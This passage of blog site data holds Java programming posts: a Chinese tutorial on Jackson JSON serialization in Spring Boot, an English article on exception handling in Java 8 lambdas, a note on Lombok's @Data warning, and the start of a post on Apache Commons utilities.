json字符串",slug:"指定对象class转成-json字符串"},{level:3,title:"List集合转化成json字符串",slug:"list集合转化成json字符串"},{level:3,title:"Json字符串转化成指定Class类",slug:"json字符串转化成指定class类"},{level:3,title:"Json字符串转化成集合List",slug:"json字符串转化成集合list"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' springboot \n Spring Boot内置的Jackson,来完成JSON的序列化和反序列化操作也挺方便。Jackson不但可以完成简单的序列化和反序列化操作，也能实现复杂的个性化的序列化和反序列化操作。 \n 自定义ObjectMapper \n 在Spring中使用@ResponseBody注解可以将方法返回的对象序列化成JSON。比如： \n // UserController.java \n @RequestMapping ( "getuser" ) \n @ResponseBody \n public   User   getUser ( )   { \n     User  user  =   new   User ( ) ; \n    user . setUserName ( "mrbird" ) ; \n    user . setBirthday ( new   Date ( ) ) ; \n     return  user ; \n } \n\n // User.java \n public   class   User   implements   Serializable   { \n     private   static   final   long  serialVersionUID  =   6222176558369919436L ; \n\n     private   String  userName ; \n     private   int  age ; \n     private   String  password ; \n     private   Date  birthday ; \n     . . . \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 访问getuser页面输出： \n {"userName":"mrbird","age":0,"password":null,"birthday":1522634892365}\n \n 1 可看到时间默认以时间戳的形式输出，如果想要改变这个默认行为，我们可以自定义一个ObjectMapper来替代： \n import   java . text . SimpleDateFormat ; \n\n import   org . springframework . context . annotation . Bean ; \n import   org . springframework . context . annotation . Configuration ; \n\n import   com . fasterxml . jackson . databind . ObjectMapper ; \n\n @Configuration \n public   class   JacksonConfig   { \n     @Bean \n     public   ObjectMapper   getObjectMapper ( ) { \n         ObjectMapper  mapper  =   new   ObjectMapper ( ) ; \n        mapper . setDateFormat ( new   SimpleDateFormat ( "yyyy-MM-dd HH:mm:ss" ) ) ; \n         return  mapper ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 上面配置获取了ObjectMapper对象，并且设置了时间格式。再次访问getuser，页面输出： \n {"userName":"mrbird","age":0,"password":null,"birthday":"2018-04-02 10:14:24"}\n \n 1 #  序列化 \n Jackson通过使用mapper的writeValueAsString方法将Java对象序列化为JSON格式字符串： \n @Autowired \n ObjectMapper  mapper ; \n\n @RequestMapping ( "serialization" ) \n @ResponseBody \n public   String   serialization ( )   { \n     try   { \n         User  user  =   new   User ( ) ; \n        user . setUserName ( "mrbird" ) ; \n        user . setBirthday ( new   Date ( ) ) ; \n         String  str  =  mapper . writeValueAsString ( user ) ; \n         return  str ; \n     }   catch   ( Exception  e )   { \n        e . printStackTrace ( ) ; \n     } \n     return   null ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #  反序列化 \n 使用@ResponseBody注解可以使对象序列化为JSON格式字符串，除此之外，Jackson也提供了反序列化方法。 \n 树遍历 \n 当采用树遍历的方式时，JSON被读入到JsonNode对象中，可以像操作XML DOM那样读取JSON。比如： \n @Autowired \n ObjectMapper  mapper ; \n\n @RequestMapping ( "readjsonstring" ) \n @ResponseBody \n public   String   readJsonString ( )   { \n     try   { \n         String  json  =   "{\\"name\\":\\"mrbird\\",\\"age\\":26}" ; \n         JsonNode  node  =   this . mapper . readTree ( json ) ; \n         String  name  =  node . get ( "name" ) . asText ( ) ; \n         int  age  =  node . get ( "age" ) . asInt ( ) ; \n         return  name  +   " "   +  age ; \n     }   catch   ( Exception  e )   { \n        e . printStackTrace ( ) ; \n     } \n     return   null ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 readTree方法可以接受一个字符串或者字节数组、文件、InputStream等， 返回JsonNode作为根节点，你可以像操作XML DOM那样操作遍历JsonNode以获取数据。 \n 解析多级JSON例子 \n String  json  =   "{\\"name\\":\\"mrbird\\",\\"hobby\\":{\\"first\\":\\"sleep\\",\\"second\\":\\"eat\\"}}" ; ; \n JsonNode  node  =   this . mapper . readTree ( json ) ; \n JsonNode  hobby  =  node . get ( "hobby" ) ; \n String  first  =  hobby . get ( "first" ) . asText ( ) ; \n \n 1 2 3 4 #  绑定对象 \n @Autowired \n ObjectMapper  mapper ; \n\n @RequestMapping ( "readjsonasobject" ) \n @ResponseBody \n public   String   readJsonAsObject ( )   { \n     try   { \n         String  json  =   "{\\"name\\":\\"mrbird\\",\\"age\\":26}" ; \n         User  user  =  mapper . readValue ( json ,   User . class ) ; \n         String  name  =  user . getUserName ( ) ; \n         int  age  =  user . getAge ( ) ; \n         return  name  +   " "   +  age ; \n     }   catch   ( Exception  e )   { \n        e . printStackTrace ( ) ; \n     } \n     return   null ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #  Jackson注解 \n Jackson包含了一些实用的注解： \n @JsonProperty \n @JsonProperty，作用在属性上，用来为JSON Key指定一个别名。 \n @JsonProperty ( "bth" ) \n private   Date  birthday ; \n \n 1 2 再次访问getuser页面输出： \n { "userName" : "mrbird" , "age" : 0 , "password" : null , "bth" : "2018-04-02 10:38:37" } \n \n 1 key birthday已经被替换为了bth。 \n @Jsonlgnore \n @Jsonlgnore，作用在属性上，用来忽略此属性。 \n @JsonIgnore \n private   String  password ; \n \n 1 2 再次访问getuser页面输出： \n { "userName" : "mrbird" , "age" : 0 , "bth" : "2018-04-02 10:40:45" } \n \n 1 password属性已被忽略。 \n @JsonIgnoreProperties \n @JsonIgnoreProperties，忽略一组属性，作用于类上，比如JsonIgnoreProperties({ "password", "age" })。 \n @JsonIgnoreProperties ( {   "password" ,   "age"   } ) \n public   class   User   implements   Serializable   { \n     . . . \n } \n \n 1 2 3 4 再次访问getuser页面输出： \n { "userName" : "mrbird" , "bth" : "2018-04-02 10:45:34" } \n \n 1 #  @JsonFormat \n @JsonFormat，用于日期格式化，如： \n @JsonFormat ( pattern  =   "yyyy-MM-dd HH:mm:ss" ) \n private   Date  birthday ; \n \n 1 2 #  @JsonNaming \n @JsonNaming，用于指定一个命名策略，作用于类或者属性上。Jackson自带了多种命名策略，你可以实现自己的命名策略，比如输出的key 由Java命名方式转为下面线命名方法 —— userName转化为user-name。 \n @JsonNaming ( PropertyNamingStrategy . LowerCaseWithUnderscoresStrategy . class ) \n public   class   User   implements   Serializable   { \n     . . . \n } \n \n 1 2 3 4 再次访问getuser页面输出： \n { "user_name" : "mrbird" , "bth" : "2018-04-02 10:52:12" } \n \n 1 #  @JsonSerialize \n @JsonSerialize，指定一个实现类来自定义序列化。类必须实现JsonSerializer接口，代码如下： \n import   java . io . IOException ; \n\n import   com . example . pojo . User ; \n import   com . fasterxml . jackson . core . JsonGenerator ; \n import   com . fasterxml . jackson . core . JsonProcessingException ; \n import   com . fasterxml . jackson . databind . JsonSerializer ; \n import   com . fasterxml . jackson . databind . SerializerProvider ; \n\n public   class   UserSerializer   extends   JsonSerializer < User >   { \n\n     @Override \n     public   void   serialize ( User  user ,   JsonGenerator  generator ,   SerializerProvider  provider ) \n             throws   IOException ,   JsonProcessingException   { \n        generator . writeStartObject ( ) ; \n        generator . writeStringField ( "user-name" ,  user . getUserName ( ) ) ; \n        generator . writeEndObject ( ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 上面的代码中我们仅仅序列化userName属性，且输出的key是user-name。 使用注解@JsonSerialize来指定User对象的序列化方式： \n @JsonSerialize ( using  =   UserSerializer . class ) \n public   class   User   implements   Serializable   { \n     . . . \n } \n \n 1 2 3 4 再次访问getuser页面输出： \n { "user-name" : "mrbird" } \n \n 1 #  @JsonDeserialize \n @JsonDeserialize，用户自定义反序列化，同@JsonSerialize ，类需要实现JsonDeserializer接口。 \n import   java . io . IOException ; \n\n import   com . example . pojo . User ; \n import   com . fasterxml . jackson . core . JsonParser ; \n import   com . fasterxml . jackson . core . JsonProcessingException ; \n import   com . fasterxml . jackson . databind . DeserializationContext ; \n import   com . fasterxml . jackson . databind . JsonDeserializer ; \n import   com . fasterxml . jackson . databind . JsonNode ; \n\n public   class   UserDeserializer   extends   JsonDeserializer < User >   { \n\n     @Override \n     public   User   deserialize ( JsonParser  parser ,   DeserializationContext  context ) \n             throws   IOException ,   JsonProcessingException   { \n         JsonNode  node  =  parser . getCodec ( ) . readTree ( parser ) ; \n         String  userName  =  node . get ( "user-name" ) . asText ( ) ; \n         User  user  =   new   User ( ) ; \n        user . setUserName ( userName ) ; \n         return  user ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 使用注解@JsonDeserialize来指定User对象的序列化方式： \n @JsonDeserialize   ( using  =   UserDeserializer . class ) \n public   class   User   implements   Serializable   { \n     . . . \n } \n \n 1 2 3 4 测试： \n @Autowired \n ObjectMapper  mapper ; \n\n @RequestMapping ( "readjsonasobject" ) \n @ResponseBody \n public   String   readJsonAsObject ( )   { \n     try   { \n         String  json  =   "{\\"user-name\\":\\"mrbird\\"}" ; \n         User  user  =  mapper . readValue ( json ,   User . class ) ; \n         String  name  =  user . getUserName ( ) ; \n         return  name ; \n     }   catch   ( Exception  e )   { \n        e . printStackTrace ( ) ; \n     } \n     return   null ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 访问readjsonasobject，页面输出： \n mrbird\n \n 1 #  @JsonView \n @JsonView，作用在类或者属性上，用来定义一个序列化组。 比如对于User对象，某些情况下只返回userName属性就行，而某些情况下需要返回全部属性。 因此User对象可以定义成如下： \n public   class   User   implements   Serializable   { \n     private   static   final   long  serialVersionUID  =   6222176558369919436L ; \n\n     public   interface   UserNameView   { } ; \n     public   interface   AllUserFieldView   extends   UserNameView   { } ; \n\n     @JsonView ( UserNameView . class ) \n     private   String  userName ; \n\n     @JsonView ( AllUserFieldView . class ) \n     private   int  age ; \n\n     @JsonView ( AllUserFieldView . class ) \n     private   String  password ; \n\n     @JsonView ( AllUserFieldView . class ) \n     private   Date  birthday ; \n     . . . \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 User定义了两个接口类，一个为userNameView，另外一个为AllUserFieldView继承了userNameView接口。这两个接口代表了两个序列化组的名称。属性userName使用了@JsonView(UserNameView.class)，而剩下属性使用了@JsonView(AllUserFieldView.class)。 \n Spring中Controller方法允许使用@JsonView指定一个组名，被序列化的对象只有在这个组的属性才会被序列化，代码如下： \n @JsonView ( User . UserNameView . class ) \n @RequestMapping ( "getuser" ) \n @ResponseBody \n public   User   getUser ( )   { \n     User  user  =   new   User ( ) ; \n    user . setUserName ( "mrbird" ) ; \n    user . setAge ( 26 ) ; \n    user . setPassword ( "123456" ) ; \n    user . setBirthday ( new   Date ( ) ) ; \n     return  user ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 访问getuser页面输出： \n { "userName" : "mrbird" } \n \n 1 如果将@JsonView(User.UserNameView.class)替换为@JsonView(User.AllUserFieldView.class)，输出： \n { "userName" : "mrbird" , "age" : 26 , "password" : "123456" , "birthday" : "2018-04-02 11:24:00" } \n \n 1 因为接口AllUserFieldView继承了接口UserNameView所以userName也会被输出。 \n 集合的反序列化 \n 在Controller方法中，可以使用＠RequestBody将提交的JSON自动映射到方法参数上，比如： \n @RequestMapping ( "updateuser" ) \n @ResponseBody \n public   int   updateUser ( @RequestBody   List < User >  list ) { \n     return  list . size ( ) ; \n } \n \n 1 2 3 4 5 上面方法可以接受如下一个JSON请求，并自动映射到User对象上： \n [{"userName":"mrbird","age":26},{"userName":"scott","age":27}]\n \n 1 Spring Boot 能自动识别出List对象包含的是User类，因为在方法中定义的泛型的类型会被保留在字节码中，所以Spring Boot能识别List包含的泛型类型从而能正确反序列化。 \n 有些情况下，集合对象并没有包含泛型定义，如下代码所示，反序列化并不能得到期望的结果。 \n @Autowired \n ObjectMapper  mapper ; \n\n @RequestMapping ( "customize" ) \n @ResponseBody \n public   String   customize ( )   throws   JsonParseException ,   JsonMappingException ,   IOException   { \n     String  jsonStr  =   "[{\\"userName\\":\\"mrbird\\",\\"age\\":26},{\\"userName\\":\\"scott\\",\\"age\\":27}]" ; \n     List < User >  list  =  mapper . readValue ( jsonStr ,   List . class ) ; \n     String  msg  =   "" ; \n     for   ( User  user  :  list )   { \n        msg  +=  user . getUserName ( ) ; \n     } \n     return  msg ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 访问customize，控制台抛出异常： \n java.lang.ClassCastException: java.util.LinkedHashMap cannot be cast to com.example.pojo.User\n \n 1 这是因为在运行时刻，泛型己经被擦除了（不同于方法参数定义的泛型，不会被擦除）。为了提供泛型信息，Jackson提供了JavaType ，用来指明集合类型，将上述方法改为： \n @Autowired \n ObjectMapper  mapper ; \n\n @RequestMapping ( "customize" ) \n @ResponseBody \n public   String   customize ( )   throws   JsonParseException ,   JsonMappingException ,   IOException   { \n     String  jsonStr  =   "[{\\"userName\\":\\"mrbird\\",\\"age\\":26},{\\"userName\\":\\"scott\\",\\"age\\":27}]" ; \n     JavaType  type  =  mapper . getTypeFactory ( ) . constructParametricType ( List . class ,   User . class ) ; \n     List < User >  list  =  mapper . readValue ( jsonStr ,  type ) ; \n     String  msg  =   "" ; \n     for   ( User  user  :  list )   { \n        msg  +=  user . getUserName ( ) ; \n     } \n     return  msg ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 访问customize，页面输出：mrbirdscott。 \n java \n 需要包：\njackson-core-2.2.3.jar（核心jar包）\njackson-annotations-2.2.3.jar（该包提供Json注解支持）\njackson-databind-2.2.3.jar \n < dependency > \n     < groupId > com.fasterxml.jackson.core </ groupId > \n     < artifactId > jackson-core </ artifactId > \n     < version > 2.9.1 </ version > \n </ dependency > \n < dependency > \n     < groupId > com.fasterxml.jackson.core </ groupId > \n     < artifactId > jackson-annotations </ artifactId > \n     < version > 2.9.1 </ version > \n </ dependency > \n < dependency > \n     < groupId > com.fasterxml.jackson.core </ groupId > \n     < artifactId > jackson-databind </ artifactId > \n     < version > 2.9.1 </ version > \n </ dependency > \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \n ObjectMapper是JSON操作的核心，Jackson的所有JSON操作都是在ObjectMapper中实现。 \n ObjectMapper有多个JSON序列化的方法，可以把JSON字符串保存File、OutputStream等不同的介质中。 \n writeValue(File arg0, Object arg1)把arg1转成json序列，并保存到arg0文件中。 \n writeValue(OutputStream arg0, Object arg1)把arg1转成json序列，并保存到arg0输出流中。 \n writeValueAsBytes(Object arg0)把arg0转成json序列，并把结果输出成字节数组。 \n writeValueAsString(Object arg0)把arg0转成json序列，并把结果输出成字符串。 \n 指定对象Class转成 json字符串 \n User  user  =   new   User ( ) ; \nuser . setName ( "小民" ) ; \nuser . setEmail ( "xiaomin@sina.com" ) ; \nuser . setAge ( 20 ) ; \n\n SimpleDateFormat  dateformat  =   new   SimpleDateFormat ( "yyyy-MM-dd" ) ; \nuser . setBirthday ( dateformat . parse ( "1996-10-01" ) ) ; \n\n ObjectMapper  mapper  =   new   ObjectMapper ( ) ; \n String  json  =  mapper . writeValueAsString ( user ) ; \n \n 1 2 3 4 5 6 7 8 9 10 #  List集合转化成json字符串 \n List < User >  users  =   new   ArrayList < User > ( ) ; \nusers . add ( user ) ; \n ObjectMapper  mapper  =   new   ObjectMapper ( ) ; \n String  jsonlist  =  mapper . writeValueAsString ( users ) ; \n \n 1 2 3 4 #  Json字符串转化成指定Class类 \n String  json  =   "{\\"name\\":\\"小民\\",\\"age\\":20,\\"birthday\\":844099200000,\\"email\\":\\"xiaomin@sina.com\\"}" ; \n /**\n * ObjectMapper支持从byte[]、File、InputStream、字符串等数据的JSON反序列化。\n */ \n ObjectMapper  mapper  =   new   ObjectMapper ( ) ; \n // 反序列化成map \n // Map map = mapper.readValue(json, Map.class); \n User  user  =  mapper . readValue ( json ,   User . class ) ; \n System . out . println ( user ) ; \n \n 1 2 3 4 5 6 7 8 9 #  Json字符串转化成集合List \n \n 方法一 \n \n String  jsonString = "[{\'id\':\'1\'},{\'id\':\'2\'}]" ; \n ObjectMapper  mapper  =   new   ObjectMapper ( ) ; \n JavaType  javaType  =  mapper . getTypeFactory ( ) . constructParametricType ( List . class ,   Bean . class ) ; \n //如果是Map类型 \n // mapper.getTypeFactory().constructParametricType(HashMap.class,String.class, Bean.class); \n List < Bean >  lst  =    ( List < Bean > ) mapper . readValue ( jsonString ,  javaType ) ; \n \n 1 2 3 4 5 6 \n 方法二 \n \n String  jsonString = "[{\'id\':\'1\'},{\'id\':\'2\'}]" ; \n ObjectMapper  mapper  =   new   ObjectMapper ( ) ; \n List < Bean >  beanList  =  mapper . readValue ( jsonString ,   new   TypeReference < List < Bean > > ( )   { } ) ; \n \n 1 2 3 '},{title:"Exceptions in Java 8 Lambda Expressions",frontmatter:{title:"Exceptions in Java 8 Lambda Expressions",date:"2022-01-15T10:39:47.000Z",tags:["exception","java8","lambda"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/java/java_lambda_exceptions.html",relativePath:"blogs/java/java_lambda_exceptions.md",key:"v-4fd337d6",path:"/blogs/java/java_lambda_exceptions.html",headers:[{level:2,title:"1. Overview",slug:"_1-overview"},{level:2,title:"2. Handling Unchecked Exceptions",slug:"_2-handling-unchecked-exceptions"},{level:2,title:"3. Handling Checked Exceptions",slug:"_3-handling-checked-exceptions"},{level:3,title:"3.1. Throwing Checked Exception from Lambda Expressions",slug:"_3-1-throwing-checked-exception-from-lambda-expressions"},{level:3,title:"3.2. Handling a Checked Exception in Lambda Expression",slug:"_3-2-handling-a-checked-exception-in-lambda-expression"},{level:2,title:"4. Conclusion",slug:"_4-conclusion"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 1. Overview \n In Java 8, Lambda Expressions started to facilitate functional programming by providing a concise way to express behavior. However, the Functional Interfaces provided by the JDK don't deal with exceptions very well – and the code becomes verbose and cumbersome when it comes to handling them. \n In this article, we'll explore some ways to deal with exceptions when writing lambda expressions. \n 2. Handling Unchecked Exceptions \n First, let's understand the problem with an example. \n We have a  List<Integer>  and we want to divide a constant, say 50 with every element of this list and print the results: \n List < Integer >  integers  =   Arrays . asList ( 3 ,   9 ,   7 ,   6 ,   10 ,   20 ) ; \nintegers . forEach ( i  ->   System . out . println ( 50   /  i ) ) ; \n \n 1 2 This expression works but there's one problem. If any of the elements in the list is 0, then we get an ArithmeticException: / by zero. Let's fix that by using a traditional try-catch block such that we log any such exception and continue execution for next elements: \n List < Integer >  integers  =   Arrays . asList ( 3 ,   9 ,   7 ,   0 ,   10 ,   20 ) ; \nintegers . forEach ( i  ->   { \n     try   { \n         System . out . println ( 50   /  i ) ; \n     }   catch   ( ArithmeticException  e )   { \n         System . err . println ( \n           \"Arithmetic Exception occured : \"   +  e . getMessage ( ) ) ; \n     } \n } ) ; \n \n 1 2 3 4 5 6 7 8 9 The use of try-catch solves the problem, but the conciseness of a Lambda Expression is lost and it's no longer a small function as it's supposed to be. \n To deal with this problem, we can write a lambda wrapper for the lambda function. Let's look at the code to see how it works: \n static   Consumer < Integer >   lambdaWrapper ( Consumer < Integer >  consumer )   { \n     return  i  ->   { \n         try   { \n            consumer . accept ( i ) ; \n         }   catch   ( ArithmeticException  e )   { \n             System . err . println ( \n               \"Arithmetic Exception occured : \"   +  e . getMessage ( ) ) ; \n         } \n     } ; \n } \n List < Integer >  integers  =   Arrays . asList ( 3 ,   9 ,   7 ,   0 ,   10 ,   20 ) ; \nintegers . forEach ( lambdaWrapper ( i  ->   System . out . println ( 50   /  i ) ) ) ; \n \n 1 2 3 4 5 6 7 8 9 10 11 12 At first, we wrote a wrapper method that will be responsible for handling the exception and then passed the lambda expression as a parameter to this method. \n The wrapper method works as expected but, you may argue that it's basically removing the try-catch block from lambda expression and moving it to another method and it doesn't reduce the actual number of lines of code being written. \n This is true in this case where the wrapper is specific to a particular use case but we can make use of generics to improve this method and use it for a variety of other scenarios: \n static   < T ,   E   extends   Exception >   Consumer < T > \n   consumerWrapper ( Consumer < T >  consumer ,   Class < E >  clazz )   { \n\n     return  i  ->   { \n         try   { \n            consumer . accept ( i ) ; \n         }   catch   ( Exception  ex )   { \n             try   { \n                 E  exCast  =  clazz . cast ( ex ) ; \n                 System . err . println ( \n                   \"Exception occured : \"   +  exCast . getMessage ( ) ) ; \n             }   catch   ( ClassCastException  ccEx )   { \n                 throw  ex ; \n             } \n         } \n     } ; \n } \n List < Integer >  integers  =   Arrays . asList ( 3 ,   9 ,   7 ,   0 ,   10 ,   20 ) ; \nintegers . forEach ( \n   consumerWrapper ( \n    i  ->   System . out . println ( 50   /  i ) , \n     ArithmeticException . class ) ) ; \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 As we can see, this iteration of our wrapper method takes two arguments, the lambda expression and the type of Exception to be caught. This lambda wrapper is capable of handling all data types, not just Integers, and catch any specific type of exception and not the superclass Exception. \n Also, notice that we have changed the name of the method from lambdaWrapper to consumerWrapper. It's because this method only handles lambda expressions for Functional Interface of type Consumer. We can write similar wrapper methods for other Functional Interfaces like Function, BiFunction, BiConsumer and so on. \n 3. Handling Checked Exceptions \n Let's modify the example from the previous section and instead of printing to the console, let's write to a file. \n static   void   writeToFile ( Integer  integer )   throws   IOException   { \n     // logic to write to file which throws IOException \n } \n \n 1 2 3 Note that the above method may throw the IOException. \n List < Integer >  integers  =   Arrays . asList ( 3 ,   9 ,   7 ,   0 ,   10 ,   20 ) ; \nintegers . forEach ( i  ->   writeToFile ( i ) ) ; \n \n 1 2 On compilation, we get the error: \n java.lang.Error: Unresolved compilation problem: Unhandled exception type IOException\nBecause IOException is a checked exception, we must handle it explicitly. We have two options. \n First, we may simply throw the exception outside of our method and take care of it somewhere else. \n Alternatively, we can handle it inside the method that uses a lambda expression. \n Let's explore both of the options. \n 3.1. Throwing Checked Exception from Lambda Expressions \n Let's see what happens when we declare the IOException on the main method: \n public   static   void   main ( String [ ]  args )   throws   IOException   { \n     List < Integer >  integers  =   Arrays . asList ( 3 ,   9 ,   7 ,   0 ,   10 ,   20 ) ; \n    integers . forEach ( i  ->   writeToFile ( i ) ) ; \n } \n \n 1 2 3 4 Still, we get the same error of unhandled IOException during the compilation. \n java.lang.Error: Unresolved compilation problem: Unhandled exception type IOException\nThis is because lambda expressions are similar to Anonymous Inner Classes. \n In our case, writeToFile method is the implementation of  Consumer<Integer>  functional interface. \n Let's take a look at the Consumer‘s definition: \n @FunctionalInterface \n public   interface   Consumer < T >   { \n     void   accept ( T  t ) ; \n } \n \n 1 2 3 4 As we can see accept method doesn't declare any checked exception. This is why writeToFile isn't allowed to throw the IOException. \n The most straightforward way would be to use a try-catch block, wrap the checked exception into an unchecked exception and rethrow it: \n List < Integer >  integers  =   Arrays . asList ( 3 ,   9 ,   7 ,   0 ,   10 ,   20 ) ; \nintegers . forEach ( i  ->   { \n     try   { \n         writeToFile ( i ) ; \n     }   catch   ( IOException  e )   { \n         throw   new   RuntimeException ( e ) ; \n     } \n } ) ; \n \n 1 2 3 4 5 6 7 8 This gets the code to compile and run. However, this approach introduces the same issue we already discussed in the previous section – it's verbose and cumbersome. \n We can get better than that. \n Let's create a custom functional interface with a single accept method that throws an exception. \n @FunctionalInterface \n public   interface   ThrowingConsumer < T ,   E   extends   Exception >   { \n     void   accept ( T  t )   throws   E ; \n } \n \n 1 2 3 4 And now, let's implement a wrapper method that's able to rethrow the exception: \n static   < T >   Consumer < T >   throwingConsumerWrapper ( \n   ThrowingConsumer < T ,   Exception >  throwingConsumer )   { \n\n     return  i  ->   { \n         try   { \n            throwingConsumer . accept ( i ) ; \n         }   catch   ( Exception  ex )   { \n             throw   new   RuntimeException ( ex ) ; \n         } \n     } ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 Finally, we're able to simplify the way we use the writeToFile method: \n List < Integer >  integers  =   Arrays . asList ( 3 ,   9 ,   7 ,   0 ,   10 ,   20 ) ; \nintegers . forEach ( throwingConsumerWrapper ( i  ->   writeToFile ( i ) ) ) ; \n \n 1 2 This is still a kind of a workaround, but the end result looks pretty clean and is definitely easier to maintain. \n Both, the ThrowingConsumer and the throwingConsumerWrapper are generic and can be easily reused in different places of our application. \n 3.2. Handling a Checked Exception in Lambda Expression \n In this final section, we'll modify the wrapper to handle checked exceptions. \n Since our ThrowingConsumer interface uses generics, we can easily handle any specific exception. \n static   < T ,   E   extends   Exception >   Consumer < T >   handlingConsumerWrapper ( \n   ThrowingConsumer < T ,   E >  throwingConsumer ,   Class < E >  exceptionClass )   { \n\n     return  i  ->   { \n         try   { \n            throwingConsumer . accept ( i ) ; \n         }   catch   ( Exception  ex )   { \n             try   { \n                 E  exCast  =  exceptionClass . cast ( ex ) ; \n                 System . err . println ( \n                   \"Exception occured : \"   +  exCast . getMessage ( ) ) ; \n             }   catch   ( ClassCastException  ccEx )   { \n                 throw   new   RuntimeException ( ex ) ; \n             } \n         } \n     } ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Let's see how to use it in practice: \n List < Integer >  integers  =   Arrays . asList ( 3 ,   9 ,   7 ,   0 ,   10 ,   20 ) ; \nintegers . forEach ( handlingConsumerWrapper ( \n  i  ->   writeToFile ( i ) ,   IOException . class ) ) ; \n \n 1 2 3 Note, that the above code handles only IOException, whereas any other kind of exception is rethrown as a RuntimeException. \n 4. Conclusion \n In this article, we showed how to handle a specific exception in lambda expression without losing the conciseness with the help of wrapper methods. We also learned how to write throwing alternatives for the Functional Interfaces present in JDK to either throw or handle a checked exception. \n Another way would be to  explore the sneaky-throws hack . \n The complete source code of Functional Interface and wrapper methods can be downloaded from  here  and test classes from  here, over on Github . \n If you are looking for the out-of-the-box working solutions,  ThrowingFunction  project is worth checking out. \n"},{title:"lombok注解@Data使用在继承类上时出现警告",frontmatter:{title:"lombok注解@Data使用在继承类上时出现警告",date:"2021-10-09 23:11:55",tags:["lombok"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/java/java_lombok_warning.html",relativePath:"blogs/java/java_lombok_warning.md",key:"v-380ef2c3",path:"/blogs/java/java_lombok_warning.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" ombok为我们提供了@Data注解，帮助我们省略了@Setter,@Getter,@ToString等注解，一般对于普通的实体类使用该注解，不会出现什么问题，但是当我们把这个注解，使用在派生类上，就出现了一个小问题。\n@Data注解的地方会出现警告： \n Generating equals/hashCode implementation but without a call to superclass, even though this class \ndoes not extend java.lang.Object. If this is intentional, add '@EqualsAndHashCode(callSuper=false)' \nto your type.\n \n 1 2 3 意思是默认子类的equals和hashCode方法，不会包含或者考虑基类的属性。我们可以通过反编译工具查看项目target/classes目录下的User.class的hashCode方法，默认情况下属性都是使用的他自身的属性。\n当我们根据警告提示，加上注解@EqualsAndHashCode(callSuper=true) ，警告消失。\n这么一来，好像就解决了在继承情况下使用@Data注解的警告问题。但是问题是，每一个继承的类，都需要这么来解决，也不是很方便。 \n 另一种办法，就是通过自定义lombok.config文件来解决。\nlombok.config文件需要放在src/main/java文件夹下的目录中（也可以放在实体同级目录下），放在src/main/resources目录下，不会生效。下面，我们通过这种方式来解决这个警告的问题。 \n \n 新建lombok.config文件，然后配置: \n \n config.stopBubbling=true\nlombok.equalsAndHashCode.callSuper=call\n \n 1 2 \n pom.xml文件中需要加入如下插件： \n \n < plugin > \n  \t < groupId > org.apache.maven.plugins </ groupId > \n  \t < artifactId > maven-compiler-plugin </ artifactId > \n  \t < configuration > \n  \t\t < source > 1.8 </ source > \n  \t\t < target > 1.8 </ target > \n  \t </ configuration > \n </ plugin > \n \n 1 2 3 4 5 6 7 8 然后，我们可以检验一下，警告是否就没有了。 \n"},{title:"java 开源工具类",frontmatter:{title:"java 开源工具类",date:"2022-01-15T11:41:37.000Z",tags:["java","tools"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/java/java_open_source_tools.html",relativePath:"blogs/java/java_open_source_tools.md",key:"v-72907a15",path:"/blogs/java/java_open_source_tools.html",headers:[{level:2,title:"字符串相关工具类",slug:"字符串相关工具类"},{level:3,title:"判断字符串是否为空",slug:"判断字符串是否为空"},{level:3,title:"字符串固定长度",slug:"字符串固定长度"},{level:3,title:"字符串关键字替换",slug:"字符串关键字替换"},{level:3,title:"字符串拼接",slug:"字符串拼接"},{level:3,title:"字符串拆分",slug:"字符串拆分"},{level:2,title:"日期相关工具类",slug:"日期相关工具类"},{level:3,title:"DateUtils/DateFormatUtils",slug:"dateutils-dateformatutils"},{level:3,title:"JDK8 时间类",slug:"jdk8-时间类"},{level:2,title:"集合/数组相关",slug:"集合-数组相关"},{level:2,title:"I/O 相关",slug:"i-o-相关"},{level:3,title:"FileUtils-文件操作工具类",slug:"fileutils-文件操作工具类"},{level:3,title:"特殊需求：FileUtils/IOUtils中写入文本的方法看上去都是只能一次性的批量写入多行，并覆盖原有的文本，如果我们需要追加写入怎么办呢。",slug:"特殊需求-fileutils-ioutils中写入文本的方法看上去都是只能一次性的批量写入多行-并覆盖原有的文本-如果我们需要追加写入怎么办呢。"},{level:3,title:"IOUtils-I/O 操作相关工具类",slug:"ioutils-i-o-操作相关工具类"},{level:2,title:"计时",slug:"计时"},{level:2,title:"总结",slug:"总结"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 下文主要分享这几个方向的常用工具类： \n 字符串相关工具类 \n Java 中 String 应该是日常用的最多一个类吧，平常我们很多代码需要围绕 String ，做一些处理。\nJDK 提供 String API 虽然比较多，但是功能比较基础，通常我们需要结合 String 多个方法才能完成一个业务功能。\n下面介绍一下 Apache 提供的一个工具类 StringUtils.\nMaven Pom 信息如下： \n < dependency > \n     < groupId > org.apache.commons </ groupId > \n     < artifactId > commons-lang3 </ artifactId > \n     < version > 3.10 